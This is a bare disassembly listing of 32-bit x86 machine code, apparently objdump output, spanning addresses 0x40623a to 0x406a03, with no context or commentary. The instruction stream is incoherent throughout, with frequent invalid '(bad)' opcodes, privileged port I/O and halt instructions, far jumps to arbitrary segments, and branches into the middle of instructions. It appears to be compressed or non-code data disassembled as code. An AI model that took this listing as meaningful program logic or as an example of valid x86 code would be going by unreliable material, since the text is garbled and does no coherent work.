  40623a:	sti    
  40623b:	inc    edi
  40623c:	jae    0x4061e8
  40623e:	cmp    al,0x15
  406240:	adc    eax,0x9f501ce2
  406245:	xor    eax,0x4b30492b
  40624a:	adc    BYTE PTR [eax-0x2dd92fed],cl
  406250:	test   al,0x17
  406252:	mov    ds:0x8af37a34,eax
  406257:	repnz and bh,BYTE PTR [ebp+0xc8350b4]
  40625e:	scas   al,BYTE PTR es:[edi]
  40625f:	pop    edx
  406260:	xchg   ecx,eax
  406261:	int3   
  406262:	sub    al,0x41
  406264:	cmp    DWORD PTR [esi+0x67ea1d21],0x56
  40626b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40626c:	pop    ecx
  40626d:	jge    0x406274
  40626f:	ins    BYTE PTR es:[edi],dx
  406270:	jne    0x40621f
  406272:	ins    BYTE PTR es:[edi],dx
  406273:	call   0xf7f72779
  406278:	popf   
  406279:	cld    
  40627a:	test   al,0xef
  40627c:	jg     0x406289
  40627e:	add    eax,0xe9ac9cff
  406283:	push   ecx
  406284:	cli    
  406285:	inc    ebp
  406286:	enter  0xcf6,0xed
  40628a:	and    DWORD PTR [esi-0x3b],ecx
  40628d:	sbb    dh,BYTE PTR [ebx]
  40628f:	cmp    eax,0x6d04e0f2
  406294:	jb     0x4062ed
  406296:	iret   
  406297:	call   0xbb11:0xc0f2acd0
  40629e:	retf   
  40629f:	xchg   ebp,eax
  4062a0:	stc    
  4062a1:	cmp    eax,0x6e4750bb
  4062a6:	mov    eax,ds:0x82026585
  4062ab:	loop   0x406320
  4062ad:	ret    0xe890
  4062b0:	imul   ebp,DWORD PTR [ecx+0x7e],0x70
  4062b4:	jae    0x4062c2
  4062b6:	push   eax
  4062b7:	fisttp DWORD PTR [ebx+0x38]
  4062ba:	in     eax,dx
  4062bb:	sbb    DWORD PTR [eax-0x74ec7cf1],ecx
  4062c1:	or     eax,0x5cb1de85
  4062c6:	dec    edx
  4062c7:	aad    0x90
  4062c9:	fdivr  DWORD PTR [eax-0x38]
  4062cc:	and    ebp,DWORD PTR [eax-0x238d7cb5]
  4062d2:	jmp    0x47357acd
  4062d7:	or     bh,dh
  4062d9:	add    DWORD PTR [ebp+eiz*1-0x6a26fe78],eax
  4062e0:	test   al,0x73
  4062e2:	retf   
  4062e3:	sub    BYTE PTR [esi-0x4],ah
  4062e6:	xor    al,0xf7
  4062e8:	mov    bl,0xca
  4062ea:	clc    
  4062eb:	les    esi,FWORD PTR [ebp+0x20dccde8]
  4062f1:	dec    edx
  4062f2:	clc    
  4062f3:	hlt    
  4062f4:	dec    eax
  4062f5:	sbb    al,dl
  4062f7:	adc    eax,0xa95ff56b
  4062fc:	inc    edx
  4062fd:	sub    al,0x58
  4062ff:	sbb    DWORD PTR [ecx-0x4a5b4139],ebx
  406305:	nop
  406306:	outs   dx,BYTE PTR ds:[esi]
  406307:	fisttp DWORD PTR [edi-0x12]
  40630a:	and    edi,DWORD PTR [edi-0x15868a38]
  406310:	pushf  
  406311:	les    edx,FWORD PTR [edx-0x79]
  406314:	sub    DWORD PTR [ebp+esi*1+0x1b],edx
  406318:	cwde   
  406319:	je     0x406301
  40631b:	pop    eax
  40631c:	xor    al,0x74
  40631e:	es sbb eax,0x909ee31b
  406324:	cwde   
  406325:	das    
  406326:	inc    esi
  406327:	test   DWORD PTR [eax-0x706160b],esp
  40632d:	jb     0x406393
  40632f:	push   ebx
  406330:	mov    ch,0xd0
  406332:	push   0xf
  406334:	(bad)  
  406335:	fnsave [esp+ebx*1+0x4f8132b7]
  40633c:	rcr    DWORD PTR [ebp+0x75],0x86
  406340:	inc    esp
  406341:	out    dx,eax
  406342:	inc    esp
  406343:	mov    ch,0x9e
  406345:	mov    dl,0x2f
  406347:	adc    cl,BYTE PTR [eax]
  406349:	out    dx,eax
  40634a:	mov    BYTE PTR [edi-0x20],al
  40634d:	call   0x5530689b
  406352:	(bad)  [esi+0x1d]
  406355:	push   ebp
  406356:	mov    edi,0x6456827e
  40635b:	xchg   ecx,eax
  40635c:	add    DWORD PTR [esi],ebx
  40635e:	jecxz  0x406326
  406360:	mov    DWORD PTR [edi-0x39],0x4b2d27e0
  406367:	sbb    al,0x3e
  406369:	vmwrite esp,DWORD PTR [eax-0x713c3721]
  406370:	mov    WORD PTR [esi-0x5ec0b2bd],fs
  406376:	adc    bl,0x36
  406379:	in     al,0xb0
  40637b:	sbb    BYTE PTR [ecx-0x63],cl
  40637e:	cmp    eax,0xfc1dea48
  406383:	mov    ds,WORD PTR [edi+eax*2+0x4b]
  406387:	mov    ecx,0xfae1374f
  40638c:	test   BYTE PTR [ebp+0x7587fa8],cl
  406392:	adc    bl,dl
  406394:	xchg   edx,eax
  406395:	or     BYTE PTR ds:0x8eb3eaa,al
  40639b:	into   
  40639c:	pop    edi
  40639d:	push   ss
  40639e:	loopne 0x4063e9
  4063a0:	(bad)
  4063a3:	int3   
  4063a4:	cmc    
  4063a5:	mov    esp,0xbdbb1aba
  4063aa:	das    
  4063ab:	stos   BYTE PTR es:[edi],al
  4063ac:	sahf   
  4063ad:	dec    edi
  4063ae:	scas   eax,DWORD PTR es:[edi]
  4063af:	jecxz  0x406358
  4063b1:	sub    DWORD PTR [ecx+0x2bc8086],esi
  4063b7:	stos   DWORD PTR es:[edi],eax
  4063b8:	cmp    DWORD PTR [ebp+0xb3525c1],ecx
  4063be:	stos   DWORD PTR es:[edi],eax
  4063bf:	shl    DWORD PTR [ecx],cl
  4063c1:	jb     0x406350
  4063c3:	inc    edi
  4063c4:	mov    bl,0x8b
  4063c6:	xlat   BYTE PTR ds:[ebx]
  4063c7:	sbb    bh,BYTE PTR [edi-0x18f66614]
  4063cd:	cld    
  4063ce:	xchg   ecx,eax
  4063cf:	outs   dx,BYTE PTR ds:[esi]
  4063d0:	adc    eax,0xfd19ac47
  4063d5:	xor    dh,BYTE PTR [ebx-0x41f613b8]
  4063db:	rcl    BYTE PTR [ebx-0x37],cl
  4063de:	and    DWORD PTR [ecx+ebx*1+0x2161cb6c],edx
  4063e5:	xor    BYTE PTR [edx],bl
  4063e7:	adc    al,BYTE PTR [eax+0x50]
  4063ea:	lods   eax,DWORD PTR ds:[esi]
  4063eb:	push   ebx
  4063ec:	add    BYTE PTR [ebx+ecx*8+0x271407d0],ch
  4063f3:	mov    edi,ecx
  4063f5:	xor    BYTE PTR [ecx],0xac
  4063f8:	js     0x406438
  4063fa:	cdq    
  4063fb:	xchg   esi,eax
  4063fc:	push   0x90d1c98b
  406401:	jmp    0x4063b2
  406403:	imul   ebp,DWORD PTR [edi-0x40],0xbfa7130a
  40640a:	pop    ecx
  40640b:	push   es
  40640c:	aaa    
  40640d:	je     0x406420
  40640f:	cmp    ebp,DWORD PTR [edx+0x2a67d1bc]
  406415:	lahf   
  406416:	and    DWORD PTR [ebp+ecx*8+0x7],ecx
  40641a:	enter  0xc1dd,0xbc
  40641e:	mov    ebx,0x65c539fd
  406423:	out    0x34,al
  406425:	sti    
  406426:	nop
  406427:	jl     0x4063c0
  406429:	shr    cl,0x2e
  40642c:	mov    eax,0x318da9a3
  406431:	mov    BYTE PTR [ebp+0x7e12fb2b],dh
  406437:	nop
  406438:	daa    
  406439:	addr16 sub ebx,esi
  40643c:	imul   ebp,ebx,0xfffffff1
  40643f:	pop    esi
  406440:	sahf   
  406441:	and    bl,dl
  406443:	das    
  406444:	push   0x98a61f0b
  406449:	mov    eax,ds:0x7a30356
  40644e:	lods   eax,DWORD PTR ds:[esi]
  40644f:	and    ebp,DWORD PTR ds:0xfed75be
  406455:	add    al,0xca
  406457:	adc    eax,0x40500694
  40645c:	add    al,0x39
  40645e:	sbb    eax,0xe5fd43cc
  406463:	bound  esp,QWORD PTR [ebx+0x37]
  406466:	push   esp
  406467:	xor    al,0x16
  406469:	cli    
  40646a:	adc    esi,eax
  40646c:	shr    al,0x27
  40646f:	xchg   edi,eax
  406470:	cwde   
  406471:	fst    QWORD PTR [eax+0x5faafd3]
  406477:	fisubr DWORD PTR [edx-0x62]
  40647a:	jnp    0x40644f
  40647c:	dec    ecx
  40647d:	jecxz  0x4064d7
  40647f:	icebp  
  406480:	xchg   ebp,eax
  406481:	call   0x27101632
  406486:	sub    DWORD PTR [edx-0x362c7bf5],esp
  40648c:	imul   ebx,DWORD PTR es:[eax],0xffffffc7
  406490:	leave  
  406491:	out    0x99,eax
  406493:	xchg   esp,eax
  406494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406495:	pop    ebx
  406496:	xor    BYTE PTR [edi+0x69efefec],0x74
  40649d:	sub    dh,dl
  40649f:	pop    es
  4064a0:	push   edi
  4064a1:	bound  edx,QWORD PTR [ecx]
  4064a3:	or     DWORD PTR [edx+0x3fc98f3a],esi
  4064a9:	loopne 0x4064d7
  4064ab:	retf   0xa3c3
  4064ae:	sub    edi,DWORD PTR [ecx]
  4064b0:	pop    ebx
  4064b1:	mov    ebp,0x671b9df5
  4064b6:	aad    0x10
  4064b8:	sar    BYTE PTR [ebp-0x39e340a3],1
  4064be:	sub    BYTE PTR [eax-0x68],ch
  4064c1:	shl    BYTE PTR ds:0xd02ee54c,0x5e
  4064c8:	popf   
  4064c9:	(bad)  
  4064ca:	loopne 0x4064e8
  4064cc:	fisttp WORD PTR gs:[ecx+esi*2-0x3d]
  4064d1:	push   esp
  4064d2:	cmp    bh,BYTE PTR [esi]
  4064d4:	clc    
  4064d5:	in     al,dx
  4064d6:	ds hlt 
  4064d8:	cmp    BYTE PTR ds:0xca06b186,0x3a
  4064df:	bound  esi,QWORD PTR [edi+0x13077445]
  4064e5:	(bad)  
  4064e7:	adc    eax,esp
  4064e9:	push   cs
  4064ea:	xchg   esi,eax
  4064eb:	mov    eax,0xc3aa6f0e
  4064f0:	out    0xe5,eax
  4064f2:	(bad)  
  4064f3:	push   ss
  4064f4:	jmp    0xf9f9:0xf75eed21
  4064fb:	(bad)  
  4064fc:	aaa    
  4064fd:	aas    
  4064fe:	scas   al,BYTE PTR es:[edi]
  4064ff:	mov    dl,0xb2
  406501:	jl     0x4064d2
  406503:	sbb    bl,BYTE PTR ds:0x77f7f9f2
  406509:	test   BYTE PTR [esi+0x17033430],dh
  40650f:	inc    esp
  406510:	adc    esp,0x1c
  406513:	cmc    
  406514:	stos   BYTE PTR es:[edi],al
  406515:	xchg   DWORD PTR [esi],eax
  406517:	test   BYTE PTR [esp+eiz*4],0x48
  40651b:	push   edx
  40651c:	or     esp,DWORD PTR cs:[ebp+0xb]
  406520:	fcmove st,st(3)
  406522:	pop    ds
  406523:	fild   WORD PTR [ebx]
  406525:	je     0x4064bb
  406527:	mov    ds:0xf8fad6f8,al
  40652c:	add    eax,0x84878fd3
  406531:	icebp  
  406532:	or     DWORD PTR [edi],edi
  406534:	imul   BYTE PTR [ecx-0x342661c9]
  40653a:	ins    DWORD PTR es:[edi],dx
  40653b:	fwait
  40653c:	pop    edx
  40653d:	cmp    esp,DWORD PTR [esi+edx*4+0x24e2024b]
  406544:	ficom  DWORD PTR [edi]
  406546:	idiv   BYTE PTR [edx-0x6b]
  406549:	(bad)
  40654d:	sub    al,0x46
  40654f:	inc    esp
  406550:	test   edi,esp
  406552:	ret    0x5625
  406555:	popa   
  406556:	push   ss
  406557:	ficomp DWORD PTR [esi+0x14]
  40655a:	(bad)  
  40655b:	cmp    ch,BYTE PTR [ecx+0x55]
  40655e:	adc    BYTE PTR [ebp+0x3a],cl
  406561:	jge    0x406590
  406563:	xor    dh,BYTE PTR [esp+edx*1-0x7f9decec]
  40656a:	pop    ecx
  40656b:	ss jno 0x4065b3
  40656e:	mov    ah,0xe4
  406570:	ss jg  0x40651e
  406573:	jne    0x406531
  406575:	push   ebp
  406576:	cdq    
  406577:	inc    ebp
  406578:	sbb    BYTE PTR [bx+di-0x4c77],al
  40657d:	xchg   esp,eax
  40657e:	sub    DWORD PTR [ebp-0x18],esp
  406581:	mov    eax,0xd3812ef0
  406586:	stc    
  406587:	push   ecx
  406588:	dec    esi
  406589:	push   edx
  40658a:	adc    DWORD PTR [edi],esi
  40658c:	mov    eax,ds:0xbff7d7f6
  406591:	jge    0x406610
  406593:	cmc    
  406594:	sub    al,0x7e
  406596:	jg     0x40656f
  406598:	lods   eax,DWORD PTR ds:[esi]
  406599:	jle    0x40660f
  40659b:	ds push eax
  40659d:	push   ebx
  40659e:	pop    eax
  40659f:	retf   
  4065a0:	js     0x406593
  4065a2:	shl    BYTE PTR [ebp-0x24],1
  4065a5:	fnstsw WORD PTR [ebp-0x7445bc78]
  4065ab:	jne    0x406570
  4065ad:	or     eax,0x195dfdb9
  4065b2:	fld    DWORD PTR [esi-0x740e0a0d]
  4065b8:	test   DWORD PTR [ebx],esp
  4065ba:	jecxz  0x40657e
  4065bc:	add    eax,ebp
  4065be:	lods   al,BYTE PTR ds:[esi]
  4065bf:	(bad)  
  4065c0:	std    
  4065c1:	sbb    BYTE PTR [esi-0x345e64bd],dh
  4065c7:	xor    dl,BYTE PTR [ebx+edi*1+0x32]
  4065cb:	aam    0xd
  4065cd:	ror    DWORD PTR [ecx-0x68],cl
  4065d0:	push   es
  4065d1:	sbb    DWORD PTR [ecx+0xd673d2e],esp
  4065d7:	mov    ch,0xc2
  4065d9:	xlat   BYTE PTR ds:[ebx]
  4065da:	cmp    bl,BYTE PTR [ebx-0x41]
  4065dd:	mov    bh,0x7c
  4065df:	ins    DWORD PTR es:[edi],dx
  4065e0:	lock inc ebx
  4065e2:	hlt    
  4065e3:	mov    dl,0x9e
  4065e5:	shl    DWORD PTR [eax],1
  4065e7:	pop    esp
  4065e8:	shl    DWORD PTR [ecx-0x57c94223],0xb4
  4065ef:	mov    WORD PTR [edx],fs
  4065f1:	pop    edi
  4065f2:	jecxz  0x4065d2
  4065f4:	mov    edi,0x5058ce96
  4065f9:	mov    cl,0xe0
  4065fb:	pop    edi
  4065fc:	imul   ebx,DWORD PTR [eax*4+0x5cef8e9b],0x9db1d1ae
  406607:	popa   
  406608:	pop    ds
  406609:	lahf   
  40660a:	addr16 sbb al,0x1a
  40660d:	sub    DWORD PTR [ebp-0x38bc09d6],esp
  406613:	es cmp eax,0xf1716e16
  406619:	das    
  40661a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40661b:	xchg   esi,eax
  40661c:	jno    0x4065d0
  40661e:	mov    dl,0x1f
  406620:	push   cs
  406621:	fild   WORD PTR [si]
  406624:	enter  0xe1fc,0xd3
  406628:	sub    dh,dh
  40662a:	pop    eax
  40662b:	adc    edi,edi
  40662d:	popf   
  40662e:	add    DWORD PTR [ebp+edx*1-0x69],ebx
  406632:	add    BYTE PTR [esp+eax*1-0x61],bh
  406636:	or     DWORD PTR [eax],ebx
  406638:	mov    edx,0xde4e8f89
  40663d:	mov    dh,0x30
  40663f:	fistp  DWORD PTR [edx-0x2f]
  406642:	leave  
  406643:	clc    
  406644:	push   ds
  406645:	(bad)  
  406646:	fwait
  406647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406648:	lods   al,BYTE PTR ds:[esi]
  406649:	cli    
  40664a:	dec    eax
  40664b:	fcom   DWORD PTR [ebp+0x46b5ad83]
  406651:	and    BYTE PTR [edx],0x96
  406654:	bound  ecx,QWORD PTR [edi-0xd]
  406657:	or     BYTE PTR [edx],0xfd
  40665a:	icebp  
  40665b:	cs mov ah,0x69
  40665e:	adc    ebp,eax
  406660:	stos   DWORD PTR es:[edi],eax
  406661:	mov    ?,WORD PTR [ebx-0x1b]
  406664:	mov    esi,0x5c35370a
  406669:	rol    DWORD PTR [ecx-0x2e7db6d7],cl
  40666f:	cmp    ah,BYTE PTR [eax+0x4decb4a9]
  406675:	mov    ebp,0x2723e2ec
  40667a:	xor    DWORD PTR [ecx+0x62],esp
  40667d:	or     al,0x6e
  40667f:	add    eax,esp
  406681:	bound  ebx,QWORD PTR [esi-0x1bf899e2]
  406687:	xchg   cl,bh
  406689:	jp     0x406684
  40668b:	jmp    0x9fad:0x27180473
  406692:	dec    ebx
  406693:	dec    ebx
  406694:	lahf   
  406695:	sbb    eax,0x613c137f
  40669a:	(bad)  
  40669b:	daa    
  40669c:	push   ebp
  40669d:	pop    edx
  40669e:	lock push es
  4066a0:	fs dec ecx
  4066a2:	or     ch,BYTE PTR [edx]
  4066a4:	jnp    0x40664e
  4066a6:	ins    BYTE PTR es:[edi],dx
  4066a7:	xchg   ecx,eax
  4066a8:	xchg   edx,eax
  4066a9:	or     ch,bl
  4066ab:	jnp    0x40670f
  4066ad:	and    eax,0x815f4af8
  4066b2:	cmp    DWORD PTR [ecx-0x46],ecx
  4066b5:	mov    al,0x88
  4066b7:	in     eax,dx
  4066b8:	pop    ecx
  4066b9:	stos   DWORD PTR es:[edi],eax
  4066ba:	push   ss
  4066bb:	sbb    ebx,DWORD PTR [esi-0x26]
  4066be:	cmp    al,0x9b
  4066c0:	add    ecx,DWORD PTR [ebx+edi*2+0x41ecf618]
  4066c7:	or     eax,edi
  4066c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066ca:	hlt    
  4066cb:	(bad)  
  4066cc:	(bad)  
  4066ce:	fsubrp st(7),st
  4066d0:	cwde   
  4066d1:	jnp    0x40666c
  4066d3:	push   eax
  4066d4:	std    
  4066d5:	ss cmp al,0x1b
  4066d8:	into   
  4066d9:	arpl   WORD PTR [eax-0xb],sp
  4066dc:	vminpd ymm2,ymm4,YMMWORD PTR [esi]
  4066e0:	xchg   BYTE PTR [ecx],al
  4066e2:	lods   al,BYTE PTR ds:[esi]
  4066e3:	leave  
  4066e4:	cmp    esp,DWORD PTR [eax+ecx*1+0x529ee5ef]
  4066eb:	stc    
  4066ec:	inc    ebp
  4066ed:	dec    esp
  4066ee:	mul    BYTE PTR [edx+0x1e]
  4066f1:	loopne 0x4066f6
  4066f3:	sbb    esi,DWORD PTR [esi]
  4066f5:	repz cmp ebx,DWORD PTR [edi]
  4066f8:	xchg   ecx,eax
  4066f9:	adc    BYTE PTR [esp+ebp*8-0x70],bh
  4066fd:	imul   ebx,esp,0xb7807538
  406703:	pop    edx
  406704:	retf   
  406705:	fs (bad) 
  406708:	fmul   DWORD PTR [esp+ebp*1+0x2bf948dd]
  40670f:	push   es
  406710:	inc    edx
  406711:	dec    edx
  406712:	jmp    0xc524ce1b
  406717:	push   esp
  406718:	(bad)
  40671d:	fmul   DWORD PTR [ebp+0x1b]
  406720:	loop   0x4066ef
  406722:	cli    
  406723:	jne    0x4066c1
  406725:	loop   0x406775
  406727:	ins    DWORD PTR es:[edi],dx
  406728:	pop    ebp
  406729:	enter  0x1b2c,0x28
  40672d:	sar    BYTE PTR [ecx+0x47ac892],0x57
  406734:	push   es
  406735:	pop    edi
  406736:	das    
  406737:	rcl    al,0xcd
  40673a:	imul   DWORD PTR [edi+eiz*8+0x63]
  40673e:	aaa    
  40673f:	addr16 inc ebx
  406741:	out    0xc7,al
  406743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406744:	add    DWORD PTR [ebx],esi
  406746:	inc    edx
  406747:	jae    0x406796
  406749:	stos   DWORD PTR es:[edi],eax
  40674a:	pop    ss
  40674b:	inc    edi
  40674c:	push   esp
  40674d:	lods   eax,DWORD PTR ds:[esi]
  40674e:	mov    edx,0xdde6ec4d
  406753:	xchg   ebp,eax
  406754:	pop    ds
  406755:	xor    al,0x73
  406757:	neg    BYTE PTR [ebp+0x6f]
  40675a:	mov    ebx,0x76434985
  40675f:	dec    edx
  406760:	dec    esp
  406761:	repnz push ebx
  406763:	xchg   esp,ecx
  406765:	scas   al,BYTE PTR es:[edi]
  406766:	xor    eax,0xadaab33c
  40676b:	call   0x73210a99
  406770:	xchg   DWORD PTR [ecx-0x323827f6],ebp
  406776:	dec    esi
  406777:	fild   QWORD PTR [ebx+0x12]
  40677a:	mov    WORD PTR [ecx],ds
  40677c:	psubw  mm5,QWORD PTR [esi+ecx*4-0x63]
  406781:	daa    
  406782:	repnz out 0x6,al
  406785:	lods   al,BYTE PTR ds:[esi]
  406786:	jle    0x406724
  406788:	jns    0x406723
  40678a:	sbb    BYTE PTR [esi-0x75],ah
  40678d:	shr    edx,1
  40678f:	or     BYTE PTR [ebx+0x4c35da4b],dh
  406795:	cmp    esi,eax
  406797:	clc    
  406798:	push   cs
  406799:	shl    DWORD PTR [ebx-0x110b3d4c],0x43
  4067a0:	dec    ebx
  4067a1:	repz push ds
  4067a3:	or     al,0x67
  4067a5:	push   edx
  4067a6:	fucomp st(7)
  4067a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a9:	hlt    
  4067aa:	inc    ebx
  4067ab:	and    cl,BYTE PTR [edi+0x4829da5d]
  4067b1:	(bad)  
  4067b2:	sbb    ch,BYTE PTR [eax+0x27f6d5c]
  4067b8:	inc    ecx
  4067b9:	fild   QWORD PTR [ecx+0x1bd79f22]
  4067bf:	sub    BYTE PTR [ecx-0x23a59a2e],bh
  4067c5:	inc    eax
  4067c6:	cmp    BYTE PTR [esi+0x2cc7d63a],0x7b
  4067cd:	sti    
  4067ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067cf:	pop    ds
  4067d0:	sbb    cl,dh
  4067d2:	sub    dh,BYTE PTR [ebp-0xa]
  4067d5:	std    
  4067d6:	or     esi,ebp
  4067d8:	aam    0x3b
  4067da:	ins    DWORD PTR es:[edi],dx
  4067db:	add    esi,esi
  4067dd:	xchg   ecx,eax
  4067de:	adc    DWORD PTR [ebp+0x64],0x17
  4067e2:	cs into 
  4067e4:	push   edx
  4067e5:	fld    DWORD PTR [esi]
  4067e7:	xor    al,BYTE PTR [ebp+0x3a]
  4067ea:	xchg   esp,eax
  4067eb:	clc    
  4067ec:	xchg   ebx,eax
  4067ed:	mov    dh,0x43
  4067ef:	fdivr  DWORD PTR [ecx+0x9]
  4067f2:	jge    0x4067d6
  4067f4:	fild   WORD PTR [edx+0x4c]
  4067f7:	int    0x43
  4067f9:	mov    dl,0x37
  4067fb:	ja     0x40679e
  4067fd:	shr    DWORD PTR [esi+0x6],cl
  406800:	mov    edx,DWORD PTR [esi]
  406802:	lods   al,BYTE PTR ds:[esi]
  406803:	int    0x97
  406805:	dec    ebp
  406806:	push   0x972f0dd8
  40680b:	xchg   esp,eax
  40680c:	lds    edi,FWORD PTR [eax+0x4a]
  40680f:	imul   esi,DWORD PTR [edx+0x31561a93],0x85f6f3ff
  406819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40681a:	fstp   DWORD PTR [ecx-0x72]
  40681d:	xchg   BYTE PTR [esi-0x73228dd6],bl
  406823:	push   eax
  406824:	loop   0x40680d
  406826:	es dec ebp
  406828:	sub    cl,BYTE PTR [eax-0x2b7372b4]
  40682e:	dec    esi
  40682f:	add    BYTE PTR [ecx-0x193d46ff],bh
  406835:	adc    edx,DWORD PTR [esi+0x4a10fd04]
  40683b:	xsaves [esi-0x1b]
  40683f:	xchg   edi,ebx
  406841:	and    BYTE PTR [edi+eax*1],0x9a
  406845:	aam    0x74
  406847:	lahf   
  406848:	push   ss
  406849:	ja     0x4068bf
  40684b:	jp     0x40686e
  40684d:	mov    eax,DWORD PTR [edi-0x5af9ae65]
  406853:	je     0x4068aa
  406855:	mov    al,0x6
  406857:	cmp    ebp,DWORD PTR cs:[esi]
  40685a:	imul   ecx,DWORD PTR [ebx],0x60
  40685d:	call   0x9e20b744
  406862:	ss stos DWORD PTR es:[edi],eax
  406864:	adc    eax,0xbeb43fe1
  406869:	xor    DWORD PTR [edi+0x44],edi
  40686c:	pop    eax
  40686d:	sbb    ah,BYTE PTR [edi-0x166fa3f0]
  406873:	dec    edx
  406874:	test   DWORD PTR [ebp+edi*8-0x2b4323cd],esp
  40687b:	add    al,0x2c
  40687d:	js     0x40684b
  40687f:	mov    esi,DWORD PTR [esp+ecx*1]
  406882:	adc    bl,BYTE PTR [eax-0x25]
  406885:	or     DWORD PTR [ecx+0x6e7ffc8c],ebx
  40688b:	pop    ebx
  40688c:	sub    eax,0x49f4b6f7
  406891:	add    eax,0x8b22bede
  406896:	imul   DWORD PTR [edi+edx*1-0xd]
  40689a:	or     al,0xf9
  40689c:	push   cs
  40689d:	xchg   esp,eax
  40689e:	rol    DWORD PTR ds:0xc186d815,1
  4068a4:	test   eax,0xc3309433
  4068a9:	call   0x6d3e:0x402a579a
  4068b0:	sub    DWORD PTR [esi],ecx
  4068b2:	sar    DWORD PTR [ecx-0x79],0x30
  4068b6:	add    eax,0x528eb2c2
  4068bb:	sbb    eax,0x661c9295
  4068c0:	dec    esi
  4068c1:	inc    eax
  4068c2:	dec    ebp
  4068c3:	mov    esp,0xffb9724e
  4068c8:	(bad)  
  4068c9:	loopne 0x406929
  4068cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068cc:	dec    edx
  4068cd:	scas   eax,DWORD PTR es:[edi]
  4068ce:	jg     0x40686e
  4068d0:	push   eax
  4068d1:	add    ecx,edi
  4068d3:	xchg   ecx,eax
  4068d4:	in     al,dx
  4068d5:	ss sub al,al
  4068d8:	or     al,0xae
  4068da:	sub    BYTE PTR [edi+0x74],bl
  4068dd:	ss jl  0x4068cd
  4068e0:	xchg   ecx,eax
  4068e1:	jp     0x406929
  4068e3:	jle    0x4068c8
  4068e5:	dec    ecx
  4068e6:	mov    al,0x86
  4068e8:	cmp    eax,0x6ae08e94
  4068ed:	(bad)  
  4068ee:	pop    ebp
  4068ef:	push   edx
  4068f0:	adc    al,0xc9
  4068f3:	or     al,0xbd
  4068f5:	mov    esi,0x2564d355
  4068fa:	or     dh,BYTE PTR [esi-0x41]
  4068fd:	dec    edx
  4068fe:	sahf   
  4068ff:	das    
  406900:	or     DWORD PTR [ecx+ecx*2],edx
  406903:	mov    ah,0xae
  406905:	xor    al,0x70
  406907:	cmp    al,0xd8
  406909:	cmp    BYTE PTR [ebx+ebx*8-0x60],bl
  40690d:	ret    0x346c
  406910:	adc    al,0xdd
  406912:	mov    edx,0x59855228
  406917:	data16 jno 0x406951
  40691a:	loop   0x4068cc
  40691c:	leave  
  40691d:	ret    0xd6d8
  406920:	or     bh,BYTE PTR [edi-0x52]
  406923:	leave  
  406924:	mov    dh,0x87
  406927:	mov    esi,0x603217ff
  40692c:	mov    ?,WORD PTR [edx]
  40692e:	lods   eax,DWORD PTR ds:[esi]
  40692f:	ins    DWORD PTR es:[edi],dx
  406930:	sub    DWORD PTR [ebp+eiz*4-0x3e],ecx
  406934:	lock retf 0x4505
  406938:	jo     0x40694c
  40693a:	mov    eax,0xb3e4c6e7
  40693f:	cld    
  406940:	mov    dl,0x3
  406942:	fadd   QWORD PTR [eax+0x23]
  406945:	daa    
  406946:	idiv   DWORD PTR es:[edx-0x38d855dc]
  40694d:	pop    es
  40694e:	jmp    0x406948
  406950:	addr16 jmp 0x4069b1
  406953:	sbb    esi,DWORD PTR [eax]
  406955:	xor    dh,bh
  406957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406958:	arpl   WORD PTR [edx],bx
  40695a:	inc    esi
  40695b:	xor    BYTE PTR [ecx+0x46],bl
  40695e:	(bad)  
  40695f:	and    ch,BYTE PTR [eax]
  406961:	adc    ch,ch
  406963:	inc    eax
  406964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406965:	nop
  406966:	jg     0x4069d0
  406968:	fild   QWORD PTR [esi]
  40696a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40696b:	fdivr  DWORD PTR [eax+0x4d2866e0]
  406971:	xor    ebp,0x844fc7dd
  406977:	fistp  WORD PTR [edi-0x11c3761a]
  40697d:	rcl    DWORD PTR [ebx+0x69],0x15
  406981:	gs adc esp,ebx
  406984:	sbb    al,0x26
  406986:	dec    eax
  406987:	push   esi
  406988:	mov    al,0xf
  40698a:	jp     0x406919
  40698c:	add    BYTE PTR [ebp+eiz*2-0x1a8b5413],0xb
  406994:	pop    edi
  406995:	xchg   ebp,eax
  406996:	push   edi
  406997:	enter  0x98a4,0x45
  40699b:	xchg   DWORD PTR [eax+0x387261bf],ecx
  4069a1:	xchg   DWORD PTR [esi],ebp
  4069a3:	jmp    DWORD PTR [edx]
  4069a5:	loope  0x4069a7
  4069a7:	mov    ds:0x6ad1665a,al
  4069ac:	dec    esi
  4069ad:	in     al,dx
  4069ae:	icebp  
  4069af:	add    ecx,DWORD PTR [edx+0x74]
  4069b2:	hlt    
  4069b3:	sub    ebx,DWORD PTR [ebx+0x48f064a7]
  4069b9:	jmp    0x40698c
  4069bb:	mov    dl,bl
  4069bd:	inc    edi
  4069be:	sbb    al,0xbb
  4069c0:	mov    eax,0x67b2ddec
  4069c5:	repz mov ds:0xe7acb2c8,al
  4069cb:	xchg   DWORD PTR [ebx+0x7f],esi
  4069ce:	fwait
  4069cf:	sbb    BYTE PTR [ebx+0x4d],0xdf
  4069d3:	sbb    ebx,ebp
  4069d5:	dec    edi
  4069d6:	jo     0x406a2c
  4069d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069d9:	pop    eax
  4069da:	aaa    
  4069db:	fcomp  DWORD PTR [esi+0x3ae22050]
  4069e1:	mov    al,ds:0x642b758d
  4069e6:	ret    
  4069e7:	cmp    bl,BYTE PTR [esi+0x20]
  4069ea:	inc    edi
  4069eb:	jo     0x406971
  4069ed:	pop    edi
  4069ee:	std    
  4069ef:	nop
  4069f0:	test   eax,ecx
  4069f2:	mov    dh,0x65
  4069f4:	add    edx,esp
  4069f6:	pop    eax
  4069f7:	or     al,ch
  4069f9:	imul   edi,edi,0x3c844553
  4069ff:	mov    WORD PTR [edx],?
  406a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a02:	leave  
  406a03:	mov    ebx,0x90376b7f
